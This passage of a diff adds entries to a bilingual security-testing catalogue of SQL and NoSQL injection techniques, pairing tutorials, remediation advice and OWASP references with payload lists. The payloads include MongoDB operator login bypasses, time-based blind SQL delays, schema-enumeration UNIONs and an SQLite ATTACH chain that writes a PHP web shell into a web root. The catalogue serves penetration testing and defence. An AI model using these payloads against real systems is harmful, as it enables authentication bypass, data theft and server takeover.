+          "en": "Stop after determining one minimal closure and one true/false differential; do not add parentheses, semicolons, or alternate comment styles."
+        },
+        {
+          "zh": "回滚标记数据，清除测试响应缓存与详细 SQL 日志，并恢复统一错误处理和参数绑定。",
+          "en": "Roll back marker data, clear test response caches and verbose SQL logs, and restore uniform error handling and parameter binding."
+        }
+      ],
+      "name": {
+        "zh": "布尔条件与闭合变体",
+        "en": "Boolean Predicate and Closure Variants"
+      },
+      "description": {
+        "zh": "组合井号、双连字符、分号与不同括号闭合方式，用真假条件定位字面量和嵌套查询边界。",
+        "en": "Combines hash comments, double hyphens, semicolons, and parenthesis closures with true and false predicates to locate query boundaries."
+      },
+      "category": {
+        "zh": "SQL/NoSQL注入",
+        "en": "SQL/NoSQL Injection"
+      },
+      "subCategory": {
+        "zh": "布尔盲注闭合探测",
+        "en": "Boolean Blind Closure Probing"
+      },
+      "tutorial": {
+        "overview": {
+          "zh": "布尔条件与闭合变体聚焦原名称只是语料来源，审校后改为具体用途；从一个引号与一种注释规则开始，逐步调整括号深度。 审校时必须先确认适用的数据库、解析层和请求上下文，并保留正常请求作为对照。",
+          "en": "Boolean Predicate and Closure Variants focuses on this boundary: The source-branded name did not describe purpose; start with one quote and comment convention and adjust parenthesis depth incrementally. Confirm the applicable database, parsing layer, and request context, and retain a normal-request control."
+        },
+        "vulnerability": {
+          "zh": "字符串拼接允许输入关闭字面量、注释剩余 SQL 或补齐嵌套括号；不同 DBMS 对注释尾随空白和分号规则不同。 根因仍需追溯到数据与查询结构未隔离，而不能把 WAF 命中或数据库产品差异当作漏洞本身。",
+          "en": "String concatenation lets input close literals, comment remaining SQL, or balance parentheses; DBMS products differ in comment whitespace and semicolon rules. The root cause must still be traced to a failure to separate data from query structure, rather than to a WAF match or a product difference alone."
+        },
+        "exploitation": {
+          "zh": "对每一种闭合深度同时发送结构相同的恒真和恒假条件，每次只增加一个右括号并记录错误位置。 真假条件必须导致可重复业务记录差异并对应最终 SQL；两个请求都报错或只改变通用错误页都不能确认。 测试过程应记录请求字节、应用参数、数据库日志和最终业务对象，形成可重复证据链。",
+          "en": "For each closure depth, send structurally identical true and false conditions, add one closing parenthesis at a time, and record error positions. True and false conditions must produce repeatable business-record differences matching final SQL; both requests failing or changing only a generic error page is insufficient. Record request bytes, application parameters, database logs, and final business objects to create a repeatable evidence chain."
+        },
+        "mitigation": {
+          "zh": "参数化查询并对数字、枚举执行服务端类型转换，不依赖转义或注释黑名单，并回归所有已识别闭合深度。 修复后重放同一正常、阳性和阴性对照，确认业务功能保留，且原先的查询结构或证据差异完全消失。",
+          "en": "Parameterize queries, convert numeric and enum input server-side, avoid escaping or comment blacklists, and regress all identified closure depths. After remediation, replay the same normal, positive, and negative controls to confirm valid behavior remains and the former query-structure difference is gone."
+        },
+        "difficulty": "intermediate"
+      },
+      "attackChain": [
+        {
+          "title": {
+            "zh": "确认布尔盲注闭合探测前置条件",
+            "en": "Confirm Boolean Blind Closure Probing prerequisites"
+          },
+          "description": {
+            "zh": "原名称只是语料来源，审校后改为具体用途；从一个引号与一种注释规则开始，逐步调整括号深度。 同时记录数据库产品、版本、驱动、字段类型以及正常响应和服务端日志基线。",
+            "en": "The source-branded name did not describe purpose; start with one quote and comment convention and adjust parenthesis depth incrementally. Record the database product, version, driver, field type, normal response, and server-log baseline."
+          }
+        },
+        {
+          "title": {
+            "zh": "执行受控布尔盲注闭合探测探针",
+            "en": "Run a controlled Boolean Blind Closure Probing probe"
+          },
+          "description": {
+            "zh": "对每一种闭合深度同时发送结构相同的恒真和恒假条件，每次只增加一个右括号并记录错误位置。 一次只改变一个变量，并保留结构一致的阴性对照，避免把多个方言或技术混在同一请求中。",
+            "en": "For each closure depth, send structurally identical true and false conditions, add one closing parenthesis at a time, and record error positions. Change one variable at a time and keep a structurally identical negative control instead of mixing dialects or techniques in one request."
+          },
+          "payload": "1’ AND 1=1#\n1’ AND 1=1-- -\n1’ AND 1=1;--\n1’ AND 1=1;#\n1’ OR ‘1’=’1’#\n1’ OR ‘1’=’1’-- -\n1’ OR ‘1’=’1’;--\n1’ OR ‘1’=’1’;#\n1’) AND (‘1’=’1\n1’) OR (‘1’=’1\n1’)) AND ((‘1’=’1\n1’)) OR ((‘1’=’1"
+        },
+        {
+          "title": {
+            "zh": "核对布尔盲注闭合探测成功证据",
+            "en": "Verify Boolean Blind Closure Probing evidence"
+          },
+          "description": {
+            "zh": "真假条件必须导致可重复业务记录差异并对应最终 SQL；两个请求都报错或只改变通用错误页都不能确认。 将边界设备、应用和数据库时间戳关联，排除缓存、重试、通用错误页和网络抖动。",
+            "en": "True and false conditions must produce repeatable business-record differences matching final SQL; both requests failing or changing only a generic error page is insufficient. Correlate timestamps across edge, application, and database logs and exclude caching, retries, generic error pages, and network jitter."
+          }
+        },
+        {
+          "title": {
+            "zh": "修复并回归布尔盲注闭合探测",
+            "en": "Remediate and regress Boolean Blind Closure Probing"
+          },
+          "description": {
+            "zh": "参数化查询并对数字、枚举执行服务端类型转换，不依赖转义或注释黑名单，并回归所有已识别闭合深度。 使用相同三组基线重放，正常业务必须继续工作，而注入内容不得再改变最终查询或授权结果。",
+            "en": "Parameterize queries, convert numeric and enum input server-side, avoid escaping or comment blacklists, and regress all identified closure depths. Replay the same three controls; valid business behavior must remain and injected input must no longer alter final queries or authorization."
+          }
+        }
+      ],
+      "references": [
+        "https://owasp.org/www-community/attacks/Blind_SQL_Injection",
+        "https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05-Testing_for_SQL_Injection"
+      ],
+      "review": {
+        "decision": "payload",
+        "rationale": "原字符串均为同一布尔闭合技术的 Payload，已去除来源品牌化命名。",
+        "issuesResolved": [
+          "corrected-name",
+          "corrected-description",
+          "reviewed-command-dialects",
+          "added-tutorial",
+          "rewrote-attack-chain",
+          "added-authoritative-references",
+          "defined-success-and-false-positive-evidence"
+        ]
+      }
+    },
+    {
+      "id": "sqli2-nosql",
+      "prerequisites": [
+        {
+          "zh": "使用独立 MongoDB 测试集合和合成账户，确认 API 是否把 JSON 对象直接传给驱动及其操作符清洗配置。",
+          "en": "Use an isolated MongoDB test collection and synthetic accounts, confirming whether the API passes JSON objects directly to the driver and how operators are sanitized."
+        },
+        {
+          "zh": "开启带请求令牌的命令审计或短期 profiler，并为 $ne、$gt、$regex、$exists 和 $where 准备匹配与不匹配对照。",
+          "en": "Enable request-token command auditing or a short-lived profiler, and prepare matching and nonmatching controls for $ne, $gt, $regex, $exists, and $where."
+        }
+      ],
+      "analysis": {
+        "zh": "阳性是原本应为标量的字段被解析为 MongoDB 操作符对象，使查询命中只能由合成标记识别的文档或绕过测试账户的恒假凭据，并由数据库命令记录确认。JSON 被接受、返回 400、正则耗时、输入回显、或普通空密码测试成功都不是操作符注入证据。",
+        "en": "Positive evidence is a field expected to be scalar being parsed as a MongoDB operator object and matching a uniquely marked synthetic document or bypassing a deliberately false test credential, confirmed by database command records. JSON acceptance, HTTP 400, regex latency, input reflection, or success with an ordinary blank-password test is not operator-injection evidence."
+      },
+      "opsecTips": [
+        {
+          "zh": "第一个合成文档或测试账户匹配后停止，不在大型集合运行 $where 或无界正则，也不读取真实用户记录。",
+          "en": "Stop after the first synthetic document or test-account match; do not run $where or unbounded regex against a large collection or read real user records."
+        },
+        {
+          "zh": "删除测试集合与合成账户，关闭 profiler，清除审计令牌，并恢复操作符白名单和输入 schema。",
+          "en": "Drop the test collection and synthetic accounts, disable the profiler, clear audit tokens, and restore operator allowlists and the input schema."
+        }
+      ],
+      "name": {
+        "zh": "MongoDB 查询运算符注入",
+        "en": "MongoDB Query-Operator Injection"
+      },
+      "description": {
+        "zh": "用 $gt、$ne、$regex、$exists、$where 和逻辑对象替换预期标量，验证 JSON 是否直接变成 MongoDB 条件。",
+        "en": "Replaces expected scalars with $gt, $ne, $regex, $exists, $where, and logical objects to test whether JSON becomes MongoDB criteria."
+      },
+      "category": {
+        "zh": "SQL/NoSQL注入",
+        "en": "SQL/NoSQL Injection"
+      },
+      "subCategory": {
+        "zh": "MongoDB 运算符注入",
+        "en": "MongoDB Operator Injection"
+      },
+      "tutorial": {
+        "overview": {
+          "zh": "MongoDB 查询运算符注入聚焦NoSQL 注入不依赖 SQL 引号；应区分 JSON 对象运算符注入与旧式 JavaScript/$where 字符串注入，并记录驱动配置。 审校时必须先确认适用的数据库、解析层和请求上下文，并保留正常请求作为对照。",
+          "en": "MongoDB Query-Operator Injection focuses on this boundary: NoSQL injection does not require SQL quotes; distinguish JSON operator injection from legacy JavaScript or $where string injection and record driver settings. Confirm the applicable database, parsing layer, and request context, and retain a normal-request control."
+        },
+        "vulnerability": {
+          "zh": "接口期望字符串却接受对象，并将其直接传给 MongoDB 查询 API；启用 $where 还会引入服务端脚本求值。 根因仍需追溯到数据与查询结构未隔离，而不能把 WAF 命中或数据库产品差异当作漏洞本身。",
+          "en": "The API expects a string but accepts an object and passes it to a MongoDB query API; enabling $where also introduces server-side script evaluation. The root cause must still be traced to a failure to separate data from query structure, rather than to a WAF match or a product difference alone."
+        },
+        "exploitation": {
+          "zh": "用测试账户发送合法标量、同值对象和确定不匹配的运算符负对照，每次只修改一个身份字段。 核对最终查询对象、登录主体和命中记录 ID；HTTP 200、统一成功页面或类型错误不能单独证明认证绕过。 测试过程应记录请求字节、应用参数、数据库日志和最终业务对象，形成可重复证据链。",
+          "en": "For a test account, send a valid scalar, an equivalent object, and a guaranteed nonmatching operator control while changing only one identity field. Inspect the final query object, authenticated principal, and matched record IDs; HTTP 200, a generic success page, or a type error alone proves nothing. Record request bytes, application parameters, database logs, and final business objects to create a repeatable evidence chain."
+        },
+        "mitigation": {
+          "zh": "使用严格 JSON Schema，只接受有界字符串并拒绝对象、数组和美元键；固定查询结构并禁用不需要的 $where。 修复后重放同一正常、阳性和阴性对照，确认业务功能保留，且原先的查询结构或证据差异完全消失。",
+          "en": "Use a strict JSON Schema, accept only bounded strings, reject objects, arrays, and dollar-prefixed keys, fix the query shape, and disable unnecessary $where. After remediation, replay the same normal, positive, and negative controls to confirm valid behavior remains and the former query-structure difference is gone."
+        },
+        "difficulty": "advanced"
+      },
+      "attackChain": [
+        {
+          "title": {
+            "zh": "确认MongoDB 运算符注入前置条件",
+            "en": "Confirm MongoDB Operator Injection prerequisites"
+          },
+          "description": {
+            "zh": "NoSQL 注入不依赖 SQL 引号；应区分 JSON 对象运算符注入与旧式 JavaScript/$where 字符串注入，并记录驱动配置。 同时记录数据库产品、版本、驱动、字段类型以及正常响应和服务端日志基线。",
+            "en": "NoSQL injection does not require SQL quotes; distinguish JSON operator injection from legacy JavaScript or $where string injection and record driver settings. Record the database product, version, driver, field type, normal response, and server-log baseline."
+          }
+        },
+        {
+          "title": {
+            "zh": "执行受控MongoDB 运算符注入探针",
+            "en": "Run a controlled MongoDB Operator Injection probe"
+          },
+          "description": {
+            "zh": "用测试账户发送合法标量、同值对象和确定不匹配的运算符负对照，每次只修改一个身份字段。 一次只改变一个变量，并保留结构一致的阴性对照，避免把多个方言或技术混在同一请求中。",
+            "en": "For a test account, send a valid scalar, an equivalent object, and a guaranteed nonmatching operator control while changing only one identity field. Change one variable at a time and keep a structurally identical negative control instead of mixing dialects or techniques in one request."
+          },
+          "payload": "{\"username\":{\"$gt\":\"\"},\"password\":{\"$gt\":\"\"}}\n{\"username\":{\"$ne\":\"\"},\"password\":{\"$ne\":\"\"}}\n{\"username\":{\"$regex\":\".*\"},\"password\":{\"$regex\":\".*\"}}\n{\"$where\":\"1==1\"}\n{\"$where\":\"this.password.match(/.*/)\"}\ntrue, $where: ‘1 == 1’\n‘, $or: [ {}, { ‘a’:’a\n‘ } ], $comment:’successful MongoDB injection’\nadmin’ || ‘1’==’1\nadmin’ || 1==1\nadmin’ || 1==1//\nadmin’ || 1==1#\n{\"username\":\"admin\",\"password\":{\"$gt\":\"\"}}\n{\"username\":\"admin\",\"password\":{\"$ne\":\"\"}}\n{\"username\":\"admin\",\"password\":{\"$regex\":\".*\"}}\n{\"username\":\"admin\",\"password\":{\"$exists\":true}}\n{\"username\":\"admin\",\"password\":{$gt: \"\"}}"
+        },
+        {
+          "title": {
+            "zh": "核对MongoDB 运算符注入成功证据",
+            "en": "Verify MongoDB Operator Injection evidence"
+          },
+          "description": {
+            "zh": "核对最终查询对象、登录主体和命中记录 ID；HTTP 200、统一成功页面或类型错误不能单独证明认证绕过。 将边界设备、应用和数据库时间戳关联，排除缓存、重试、通用错误页和网络抖动。",
+            "en": "Inspect the final query object, authenticated principal, and matched record IDs; HTTP 200, a generic success page, or a type error alone proves nothing. Correlate timestamps across edge, application, and database logs and exclude caching, retries, generic error pages, and network jitter."
+          }
+        },
+        {
+          "title": {
+            "zh": "修复并回归MongoDB 运算符注入",
+            "en": "Remediate and regress MongoDB Operator Injection"
+          },
+          "description": {
+            "zh": "使用严格 JSON Schema，只接受有界字符串并拒绝对象、数组和美元键；固定查询结构并禁用不需要的 $where。 使用相同三组基线重放，正常业务必须继续工作，而注入内容不得再改变最终查询或授权结果。",
+            "en": "Use a strict JSON Schema, accept only bounded strings, reject objects, arrays, and dollar-prefixed keys, fix the query shape, and disable unnecessary $where. Replay the same three controls; valid business behavior must remain and injected input must no longer alter final queries or authorization."
+          }
+        }
+      ],
+      "references": [
+        "https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05.6-Testing_for_NoSQL_Injection",
+        "https://www.mongodb.com/docs/manual/reference/operator/query/"
+      ],
+      "review": {
+        "decision": "payload",
+        "rationale": "这些 JSON 是 MongoDB 查询边界载荷，不是 mongo 客户端命令。",
+        "issuesResolved": [
+          "corrected-name",
+          "corrected-description",
+          "reviewed-command-dialects",
+          "added-tutorial",
+          "rewrote-attack-chain",
+          "added-authoritative-references",
+          "defined-success-and-false-positive-evidence"
+        ]
+      }
+    },
+    {
+      "id": "sqli2-time-based-blind-sqli",
+      "prerequisites": [
+        {
+          "zh": "先识别唯一目标 DBMS，只使用对应的 SLEEP、WAITFOR DELAY 或 pg_sleep 方言，并验证驱动语句位置。",
+          "en": "Identify the single target DBMS first, use only its SLEEP, WAITFOR DELAY, or pg_sleep dialect, and verify the driver's statement placement."
+        },
+        {
+          "zh": "收集足够的正常时延分布和数据库会话日志，以随机顺序交错运行短延时恒真、恒假和无延时样本。",
+          "en": "Collect a sufficient normal-latency distribution and database-session logs, then interleave short-delay true, false, and no-delay samples in randomized order."
+        }
+      ],
+      "analysis": {
+        "zh": "阳性要求恒真样本的延迟分布相对恒假与无延时样本显著分离，并且每次慢响应都能关联到后端延时函数执行。单次超时、跨方言语法错误、网络峰值、WAF 挑战、锁等待、冷缓存或连接池饱和都是假阳性边界。",
+        "en": "Positive evidence requires the true samples' latency distribution to separate significantly from false and no-delay controls, with every slow response correlated to backend delay-function execution. One timeout, cross-dialect syntax errors, network spikes, WAF challenges, lock waits, cold caches, or connection-pool saturation are false-positive boundaries."
+      },
+      "opsecTips": [
+        {
+          "zh": "达到事先定义的样本数和置信阈值后停止，不把延时从短值提升到语料中的最大值。",
+          "en": "Stop when the predefined sample count and confidence threshold are reached; do not raise the delay from the short test value to the corpus maximum."
+        },
+        {
+          "zh": "取消标记会话，排空连接池，恢复数据库语句超时，并删除采样结果中的请求标识与临时指标。",
+          "en": "Cancel tagged sessions, drain the connection pool, restore database statement timeouts, and delete request identifiers and temporary metrics from the sample set."
+        }
+      ],
+      "name": {
+        "zh": "跨数据库时间盲注探测",
+        "en": "Cross-DBMS Time-Based Blind SQL Injection"
+      },
+      "description": {
+        "zh": "按 MySQL、SQL Server 和 PostgreSQL 方言使用 SLEEP、WAITFOR DELAY 与 pg_sleep，以统计证据验证无回显注入。",
+        "en": "Uses SLEEP, WAITFOR DELAY, or pg_sleep according to MySQL, SQL Server, or PostgreSQL dialect to validate non-reflected injection statistically."
+      },
+      "category": {
+        "zh": "SQL/NoSQL注入",
+        "en": "SQL/NoSQL Injection"
+      },
+      "subCategory": {
+        "zh": "跨数据库时间盲注",
+        "en": "Cross-DBMS Time-Based Blind Injection"
+      },
+      "tutorial": {
+        "overview": {
+          "zh": "跨数据库时间盲注探测聚焦通用卡统一的是证据方法而不是混用方言；先识别数据库，再只选择对应延时函数并交错采样。 审校时必须先确认适用的数据库、解析层和请求上下文，并保留正常请求作为对照。",
+          "en": "Cross-DBMS Time-Based Blind SQL Injection focuses on this boundary: The shared element is the evidence method, not mixed dialects; identify the database, choose its delay function, and interleave samples. Confirm the applicable database, parsing layer, and request context, and retain a normal-request control."
+        },
+        "vulnerability": {
+          "zh": "拼接查询可在条件为真时调用延时或高成本函数，即使无回显也通过时间泄露布尔结果，并可能占用连接资源。 根因仍需追溯到数据与查询结构未隔离，而不能把 WAF 命中或数据库产品差异当作漏洞本身。",
+          "en": "Concatenated queries can call a delay or expensive function on a true condition, leaking a Boolean result without reflection and consuming connection resources. The root cause must still be traced to a failure to separate data from query structure, rather than to a WAF match or a product difference alone."
+        },
+        "exploitation": {
+          "zh": "随机交错正常、恒真短延时和恒假短延时，多次采样并计算中位数与高分位，同时记录数据库执行时间。 数据库日志必须只在恒真分支执行延时函数；网络抖动、锁等待、缓存和应用超时均需被排除。 测试过程应记录请求字节、应用参数、数据库日志和最终业务对象，形成可重复证据链。",
+          "en": "Randomly interleave normal, true short-delay, and false short-delay requests, collect repeated samples, calculate medians and high percentiles, and record database time. Database logs must show delay execution only for the true branch; exclude network jitter, lock waits, caching, and application timeouts. Record request bytes, application parameters, database logs, and final business objects to create a repeatable evidence chain."
+        },
+        "mitigation": {
+          "zh": "参数化查询、严格类型绑定，设置语句超时、资源组和连接池上限，监控延时函数及条件化长查询。 修复后重放同一正常、阳性和阴性对照，确认业务功能保留，且原先的查询结构或证据差异完全消失。",
+          "en": "Parameterize queries, enforce strict types, configure statement timeouts, resource groups, and pool limits, and monitor delay functions and conditional long queries. After remediation, replay the same normal, positive, and negative controls to confirm valid behavior remains and the former query-structure difference is gone."
+        },
+        "difficulty": "advanced"
+      },
+      "attackChain": [
+        {
+          "title": {
+            "zh": "确认跨数据库时间盲注前置条件",
+            "en": "Confirm Cross-DBMS Time-Based Blind Injection prerequisites"
+          },
+          "description": {
+            "zh": "通用卡统一的是证据方法而不是混用方言；先识别数据库，再只选择对应延时函数并交错采样。 同时记录数据库产品、版本、驱动、字段类型以及正常响应和服务端日志基线。",
+            "en": "The shared element is the evidence method, not mixed dialects; identify the database, choose its delay function, and interleave samples. Record the database product, version, driver, field type, normal response, and server-log baseline."
+          }
+        },
+        {
+          "title": {
+            "zh": "执行受控跨数据库时间盲注探针",
+            "en": "Run a controlled Cross-DBMS Time-Based Blind Injection probe"
+          },
+          "description": {
+            "zh": "随机交错正常、恒真短延时和恒假短延时，多次采样并计算中位数与高分位，同时记录数据库执行时间。 一次只改变一个变量，并保留结构一致的阴性对照，避免把多个方言或技术混在同一请求中。",
+            "en": "Randomly interleave normal, true short-delay, and false short-delay requests, collect repeated samples, calculate medians and high percentiles, and record database time. Change one variable at a time and keep a structurally identical negative control instead of mixing dialects or techniques in one request."
+          },
+          "payload": "'||SELECT(1)AND(SELECT(1)FROM(SELECT(SLEEP(5)))a)||'\n1;SELECT SLEEP(5)--\n1' SELECT SLEEP(5)--\n1\" SELECT SLEEP(5)--\n1 AND (SELECT * FROM (SELECT(SLEEP(5)))a)\n1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--\n1 AND (SELECT COUNT(*) FROM INFORMATION_SCHEMA.TABLES A, INFORMATION_SCHEMA.TABLES B, INFORMATION_SCHEMA.TABLES C)--\n1;WAITFOR DELAY '0:0:5'--\n1';WAITFOR DELAY '0:0:5'--\n1\";WAITFOR DELAY '0:0:5'--\npg_sleep(5)--\n1;SELECT PG_SLEEP(5)--\n1' AND PG_SLEEP(5)--\n1 AND (SELECT 1 FROM PG_SLEEP(5))--"
+        },
+        {
+          "title": {
+            "zh": "核对跨数据库时间盲注成功证据",
+            "en": "Verify Cross-DBMS Time-Based Blind Injection evidence"
+          },
+          "description": {
+            "zh": "数据库日志必须只在恒真分支执行延时函数；网络抖动、锁等待、缓存和应用超时均需被排除。 将边界设备、应用和数据库时间戳关联，排除缓存、重试、通用错误页和网络抖动。",
+            "en": "Database logs must show delay execution only for the true branch; exclude network jitter, lock waits, caching, and application timeouts. Correlate timestamps across edge, application, and database logs and exclude caching, retries, generic error pages, and network jitter."
+          }
+        },
+        {
+          "title": {
+            "zh": "修复并回归跨数据库时间盲注",
+            "en": "Remediate and regress Cross-DBMS Time-Based Blind Injection"
+          },
+          "description": {
+            "zh": "参数化查询、严格类型绑定，设置语句超时、资源组和连接池上限，监控延时函数及条件化长查询。 使用相同三组基线重放，正常业务必须继续工作，而注入内容不得再改变最终查询或授权结果。",
+            "en": "Parameterize queries, enforce strict types, configure statement timeouts, resource groups, and pool limits, and monitor delay functions and conditional long queries. Replay the same three controls; valid business behavior must remain and injected input must no longer alter final queries or authorization."
+          }
+        }
+      ],
+      "references": [
+        "https://owasp.org/www-community/attacks/Blind_SQL_Injection",
+        "https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05-Testing_for_SQL_Injection"
+      ],
+      "review": {
+        "decision": "payload",
+        "rationale": "跨 DBMS 延时函数共享同一盲注证据模型，按方言选择后仍是 Payload。",
+        "issuesResolved": [
+          "corrected-name",
+          "corrected-description",
+          "reviewed-command-dialects",
+          "added-tutorial",
+          "rewrote-attack-chain",
+          "added-authoritative-references",
+          "defined-success-and-false-positive-evidence"
+        ]
+      }
+    },
+    {
+      "id": "sqli2-dbms-specific-patterns-db2-sql",
+      "prerequisites": [
+        {
+          "zh": "依据 sqlite_version、sqlite_master、pragma_table_info 和 ATTACH 等语法逐行重新识别方言，不沿用原 DB2/Cassandra/BigQuery 标签。",
+          "en": "Reidentify the dialect line by line from syntax such as sqlite_version, sqlite_master, pragma_table_info, and ATTACH, without inheriting the original DB2/Cassandra/BigQuery label."
+        },
+        {
+          "zh": "把只读目录探针与文件写入链放入不同审批和沙箱；写入分支只能使用可销毁 SQLite 副本及专用临时目录。",
+          "en": "Place read-only catalog probes and file-write chains under separate approvals and sandboxes; the write branch may use only a disposable SQLite copy and dedicated temporary directory."
+        }
+      ],
+      "analysis": {
+        "zh": "本条拆分的阳性证据是每段语法被路由到实际方言和影响模型：只读分支只能返回合成 sqlite_master 标记，写入分支必须由独立审计确认只在临时路径产生固定文件。原标签匹配、普通语法错误、返回任意版本字符串、ATTACH 被拒绝或仅生成 SQL 文本都不是相应能力的证明。",
+        "en": "Positive evidence for the split is each fragment being routed to its actual dialect and impact model: the read-only branch may return only a synthetic sqlite_master marker, while the write branch requires separate auditing of a fixed file created solely in the temporary path. Matching the original label, generic syntax errors, any version string, denied ATTACH, or merely generating SQL text does not prove the corresponding capability."
+      },
+      "opsecTips": [
+        {
+          "zh": "审校到 ATTACH 或文件写入语句时停止于拆分边界，未经独立写入验证流程不得执行。",
+          "en": "Stop at the split boundary when review reaches ATTACH or file-write statements; do not execute them without the separate write-validation workflow."
+        },
+        {
+          "zh": "删除 SQLite 副本、附加数据库和临时目录，撤销进程写权限，并清除错误的 DBMS 标签缓存与测试路由记录。",
+          "en": "Delete SQLite copies, attached databases, and the temporary directory, revoke process write permissions, and clear cached incorrect DBMS labels and test-routing records."
+        }
+      ],
+      "name": {
+        "zh": "误标数据库混合集（待拆分）",
+        "en": "Mislabeled Mixed-Database Corpus (Split Required)"
+      },
+      "description": {
+        "zh": "名称声称 DB2、Cassandra 与 BigQuery，实际却主要是 SQLite 系统表、通用 INFORMATION_SCHEMA 和 SQLite 文件写入链。",
+        "en": "The name claims DB2, Cassandra, and BigQuery, but the content is mainly SQLite catalogs, generic INFORMATION_SCHEMA, and a SQLite file-write chain."
+      },
+      "category": {
+        "zh": "SQL/NoSQL注入",
+        "en": "SQL/NoSQL Injection"
+      },
+      "subCategory": {
+        "zh": "数据库方言内容纠错与拆分",
+        "en": "Database-Dialect Correction and Split"
+      },
+      "tutorial": {
+        "overview": {
+          "zh": "误标数据库混合集（待拆分）聚焦sqlite_version、sqlite_master、pragma_table_info 和 ATTACH 均指向 SQLite，原标签没有命令支撑，继续聚合会误导。 审校时必须先确认适用的数据库、解析层和请求上下文，并保留正常请求作为对照。",
+          "en": "Mislabeled Mixed-Database Corpus (Split Required) focuses on this boundary: sqlite_version, sqlite_master, pragma_table_info, and ATTACH all indicate SQLite, leaving the original label unsupported and misleading. Confirm the applicable database, parsing layer, and request context, and retain a normal-request control."
+        },
+        "vulnerability": {
+          "zh": "数据库目录、文件权限和多语句能力完全不同；混合卡会把语法错误误判为防护，并把只读探测与文件写入混在一起。 根因仍需追溯到数据与查询结构未隔离，而不能把 WAF 命中或数据库产品差异当作漏洞本身。",
+          "en": "Catalogs, file permissions, and multi-statement capabilities differ; a mixed card confuses syntax errors with controls and combines read-only probes with file writes. The root cause must still be traced to a failure to separate data from query structure, rather than to a WAF match or a product difference alone."
+        },
+        "exploitation": {
+          "zh": "将 SQLite 版本和目录行路由到 SQLite 卡，兼容的目录 UNION 行路由到 UNION 卡，ATTACH/CREATE/INSERT 链路由到堆叠影响卡。 每个目标卡必须单独确认数据库产品、查询上下文和权限；不得按原错误标题批量执行，也不能以其他方言报错定性。 测试过程应记录请求字节、应用参数、数据库日志和最终业务对象，形成可重复证据链。",
+          "en": "Route SQLite version and catalog lines to the SQLite card, compatible catalog UNION lines to UNION, and ATTACH/CREATE/INSERT to the stacked-impact card. Each target card must separately confirm product, query context, and privileges; never batch-run under the incorrect title or classify cross-dialect errors as evidence. Record request bytes, application parameters, database logs, and final business objects to create a repeatable evidence chain."
+        },
+        "mitigation": {
+          "zh": "除参数化外，限制 SQLite 文件和 Web 根写权限，关闭不需要的多语句，并要求名称、方言和引用一致后发布。 修复后重放同一正常、阳性和阴性对照，确认业务功能保留，且原先的查询结构或证据差异完全消失。",
+          "en": "Besides parameterization, restrict SQLite file and web-root writes, disable unnecessary multi-statements, and require title, dialect, and references to agree before publication. After remediation, replay the same normal, positive, and negative controls to confirm valid behavior remains and the former query-structure difference is gone."
+        },
+        "difficulty": "expert"
+      },
+      "attackChain": [
+        {
+          "title": {
+            "zh": "确认数据库方言内容纠错与拆分前置条件",
+            "en": "Confirm Database-Dialect Correction and Split prerequisites"
+          },
+          "description": {
+            "zh": "sqlite_version、sqlite_master、pragma_table_info 和 ATTACH 均指向 SQLite，原标签没有命令支撑，继续聚合会误导。 同时记录数据库产品、版本、驱动、字段类型以及正常响应和服务端日志基线。",
+            "en": "sqlite_version, sqlite_master, pragma_table_info, and ATTACH all indicate SQLite, leaving the original label unsupported and misleading. Record the database product, version, driver, field type, normal response, and server-log baseline."
+          }
+        },
+        {
+          "title": {
+            "zh": "执行受控数据库方言内容纠错与拆分探针",
+            "en": "Run a controlled Database-Dialect Correction and Split probe"
+          },
+          "description": {
+            "zh": "将 SQLite 版本和目录行路由到 SQLite 卡，兼容的目录 UNION 行路由到 UNION 卡，ATTACH/CREATE/INSERT 链路由到堆叠影响卡。 一次只改变一个变量，并保留结构一致的阴性对照，避免把多个方言或技术混在同一请求中。",
+            "en": "Route SQLite version and catalog lines to the SQLite card, compatible catalog UNION lines to UNION, and ATTACH/CREATE/INSERT to the stacked-impact card. Change one variable at a time and keep a structurally identical negative control instead of mixing dialects or techniques in one request."
+          },
+          "payload": "1 UNION SELECT sqlite_version()--\n1 UNION SELECT sql FROM sqlite_master--\n1 UNION SELECT group_concat(tbl_name) FROM sqlite_master WHERE type='table'--\n1 UNION SELECT group_concat(name) FROM pragma_table_info('users')--\nATTACH DATABASE '/var/www/html/shell.php' AS lol;CREATE TABLE lol.pwn(dataz text);INSERT INTO lol.pwn(dataz) VALUES('<?php system([\"cmd\"]);?>');--\n1 UNION SELECT table_name FROM INFORMATION_SCHEMA.TABLES--\n1 UNION SELECT column_name FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name='users'--"
+        },
+        {
+          "title": {
+            "zh": "核对数据库方言内容纠错与拆分成功证据",
+            "en": "Verify Database-Dialect Correction and Split evidence"
+          },
+          "description": {
+            "zh": "每个目标卡必须单独确认数据库产品、查询上下文和权限；不得按原错误标题批量执行，也不能以其他方言报错定性。 将边界设备、应用和数据库时间戳关联，排除缓存、重试、通用错误页和网络抖动。",
+            "en": "Each target card must separately confirm product, query context, and privileges; never batch-run under the incorrect title or classify cross-dialect errors as evidence. Correlate timestamps across edge, application, and database logs and exclude caching, retries, generic error pages, and network jitter."
+          }
+        },
+        {
+          "title": {
+            "zh": "修复并回归数据库方言内容纠错与拆分",
+            "en": "Remediate and regress Database-Dialect Correction and Split"
+          },
+          "description": {
+            "zh": "除参数化外，限制 SQLite 文件和 Web 根写权限，关闭不需要的多语句，并要求名称、方言和引用一致后发布。 使用相同三组基线重放，正常业务必须继续工作，而注入内容不得再改变最终查询或授权结果。",
+            "en": "Besides parameterization, restrict SQLite file and web-root writes, disable unnecessary multi-statements, and require title, dialect, and references to agree before publication. Replay the same three controls; valid business behavior must remain and injected input must no longer alter final queries or authorization."
+          }
+        }
+      ],
+      "references": [
+        "https://www.sqlite.org/schematab.html",
+        "https://www.sqlite.org/lang_attach.html",
+        "https://owasp.org/www-community/attacks/SQL_Injection"
+      ],
+      "review": {
+        "decision": "split",
+        "rationale": "原标签与命令不符，且只读目录查询与文件写入链前置条件不同，必须拆分。",
+        "issuesResolved": [
+          "corrected-name",
+          "corrected-category",
+          "reviewed-command-dialects",
+          "documented-split",
+          "added-tutorial",
+          "rewrote-attack-chain",
+          "added-authoritative-references"
+        ],
+        "targetPayloadIds": [
+          "sqli2-information-schema-table-and-column-enumeration",
